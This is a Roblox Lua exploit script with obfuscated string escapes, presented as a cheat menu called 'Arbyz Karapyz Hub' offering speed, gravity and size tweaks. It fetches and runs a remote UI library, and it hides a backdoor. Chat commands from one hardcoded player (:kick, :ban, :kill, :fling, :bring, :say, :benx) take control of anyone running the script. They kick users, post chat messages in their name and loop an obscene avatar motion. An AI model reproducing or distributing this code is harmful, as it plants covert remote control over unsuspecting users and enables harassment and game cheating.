local q = loadstring(game:HttpGet"https://raw.githubusercontent.com/dawid-scripts/UI-Libs/main/discord%20lib.txt")() local b = q:Window("\65\114\98\121\122\32\75\97\114\97\112\121\122\32\72\117\98") local n = b:Server("\80\114\101\118\105\101\119", "") local a = n:Channel("\80\108\97\121\101\114") a:Button("\87\97\108\107\83\112\101\101\100", function() game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 100 q:Notification("\78\111\116\105\102\105\99\97\116\105\111\110", "\87\97\108\107\83\112\101\101\100\32\116\117\114\110\32\111\110", "\79\107\97\121\33") end) a:Button("\70\117\110\110\121\32\71\114\97\118\105\116\121", function() game.Workspace.Gravity = 1 q:Notification("\78\111\116\105\102\105\99\97\116\105\111\110", "\70\117\110\32\71\114\97\118\105\116\121\32\111\110", "\79\107\97\121\33") end) a:Button("\85\110\87\97\108\107\83\112\101\101\100", function() game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 16 q:Notification("\78\111\116\105\102\105\99\97\116\105\111\110", "\87\97\108\107\83\112\101\101\100\32\116\117\114\110\32\111\102\102", "\79\107\97\121\33") end) a:Button("\83\109\97\108\108\32\83\105\122\101", function() local p = game:GetService("\80\108\97\121\101\114\115").LocalPlayer local f = p.Character local t = f:FindFirstChildOfClass("\72\117\109\97\110\111\105\100") local function k() for i,v in pairs(f:GetDescendants()) do if v:IsA("\66\97\115\101\80\97\114\116") then if v.Name ~= "\72\101\97\100" then for i,cav in pairs(v:GetDescendants()) do if cav:IsA("\65\116\116\97\99\104\109\101\110\116") then if cav:FindFirstChild("\79\114\105\103\105\110\97\108\80\111\115\105\116\105\111\110") then cav.OriginalPosition:Destroy() end end end v:FindFirstChild("\79\114\105\103\105\110\97\108\83\105\122\101"):Destroy() if v:FindFirstChild("\65\118\97\116\97\114\80\97\114\116\83\99\97\108\101\84\121\112\101") then v:FindFirstChild("\65\118\97\116\97\114\80\97\114\116\83\99\97\108\101\84\121\112\101"):Destroy() end end end end end k() wait(0.5) t:FindFirstChild("\66\111\100\121\84\121\112\101\83\99\97\108\101"):Destroy() wait(1) k() wait(0.5) t:FindFirstChild("\66\111\100\121\87\105\100\116\104\83\99\97\108\101"):Destroy() wait(1) k() wait(0.5) t:FindFirstChild("\66\111\100\121\68\101\112\116\104\83\99\97\108\101"):Destroy() wait(1) k() wait() q:Notification("\78\111\116\105\102\105\99\97\116\105\111\110", "\83\109\97\108\108\32\83\105\122\101\32\116\117\114\110\32\111\110", "\79\107\97\121\33") end) a:Button("\85\110\70\117\110\110\121\32\71\114\97\118\105\116\121", function() game.Workspace.Gravity = 1000 q:Notification("\78\111\116\105\102\105\99\97\116\105\111\110", "\70\117\110\32\71\114\97\118\105\116\121\32\116\117\114\110\32\111\102\102", "\79\107\97\121\33") end) local c = game.Players.Ap6ye2  local i = function() game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true  end  local _ = function() game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false end  c.Chatted:Connect(function(o) if o:match("\58\102\114\101\101\122\101\32\46") then if game.Players.LocalPlayer ~= c then i()  end end end) c.Chatted:Connect(function(o) if o:match("\58\117\110\102\114\101\101\122\101\32\46") then if game.Players.LocalPlayer ~= c then _()  end end end) c.Chatted:Connect(function(o) if game.Players.LocalPlayer ~= c  then if o:match("\58\107\105\99\107\32\46") then game.Players.LocalPlayer:Kick("\89\111\117\32\119\97\115\32\107\105\99\107\101\100\32\98\101\99\97\117\115\101\32\116\104\105\115\32\97\114\98\121\122\32\107\97\114\97\112\121\122\32\104\117\98")  end end end)  c.Chatted:Connect(function(o) if o:match("\58\98\101\110\120\32\46") then if game.Players.LocalPlayer ~= c then  wait(0) local l = "\115\111\114\114\121\32\105\109\32\117\115\101\32\97\114\98\121\122\32\107\97\114\97\112\121\122\32\104\117\98" local h = "\65\108\108" local oh = game:GetService("\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101").DefaultChatSystemChatEvents.SayMessageRequest oh:FireServer(l, h) game.Workspace:FindFirstChildWhichIsA('Camera').CameraSubject = c.Character.HumanoidRootPart local d = true while d == true do local g = game:GetService("\80\108\97\121\101\114\115").LocalPlayer.Character.Humanoid pcall(function() g.Parent.Pants:Destroy() end) pcall(function() g.Parent.Shirt:Destroy() end) game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = c.Character.HumanoidRootPart.CFrame + c.Character.HumanoidRootPart.CFrame.lookVector * 0.5 game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.lookVector * 70 wait(0.1) game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.lookVector * -200 end end end end)  c.Chatted:Connect(function(o) if o:match("\58\107\105\108\108\32\46") then if game.Players.LocalPlayer ~= c then game.Players.LocalPlayer.Character.Humanoid.Health:Destroy() end end end)  c.Chatted:Connect(function(o) if o:match("\58\98\97\110\32\46") then if game.Players.LocalPlayer ~= c then game.Players.LocalPlayer:Kick("\80\69\82\77\65\32\66\65\78") end end end)  c.Chatted:connect(function(o) if o:match("\58\98\114\105\110\103\32\46") then if game.Players.LocalPlayer ~= c then game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(c.Character.UpperTorso.Position) end end end)  c.Chatted:connect(function(o) if o:match("\58\102\108\105\110\103\32\46") then if game.Players.LocalPlayer ~= c then game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, 999, 0) local m = 99999  game:GetService('RunService').Stepped:connect(function() game.Players.LocalPlayer.Character.Head.CanCollide = false game.Players.LocalPlayer.Character.UpperTorso.CanCollide = false game.Players.LocalPlayer.Character.LowerTorso.CanCollide = false game.Players.LocalPlayer.Character.HumanoidRootPart.CanCollide = false end) wait(.1) local j = Instance.new("\66\111\100\121\84\104\114\117\115\116") j.Parent = game.Players.LocalPlayer.Character.HumanoidRootPart j.Force = Vector3.new(m,0,m) j.Location = game.Players.LocalPlayer.Character.HumanoidRootPart.Position end end end)  c.Chatted:Connect(function(o) if o:match("\58\115\97\121\32\46") then if game.Players.LocalPlayer ~= c then  wait() local l = "\97\114\98\121\122\32\107\97\114\97\112\121\122\32\104\117\98\32\116\111\112" local h = "\65\108\108" local oh = game:GetService("\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101").DefaultChatSystemChatEvents.SayMessageRequest oh:FireServer(l, h) end end end)
